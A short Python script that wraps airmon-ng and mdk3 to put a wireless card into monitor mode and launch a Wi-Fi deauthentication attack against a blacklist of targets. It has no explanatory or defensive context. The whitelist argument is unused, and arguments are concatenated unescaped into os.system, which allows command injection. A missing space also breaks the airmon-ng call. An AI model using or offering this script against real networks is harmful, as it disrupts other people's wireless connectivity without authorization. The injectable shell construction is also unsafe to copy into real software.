import sys
import os 

whitelist = sys.argv[2]
blacklist = sys.argv[3]
wlan = sys.argv[1]


os.system("sudo airmon-ng start" + wlan)
os.system("sudo mdk3 " + wlan + " d " + "-b " + blacklist)

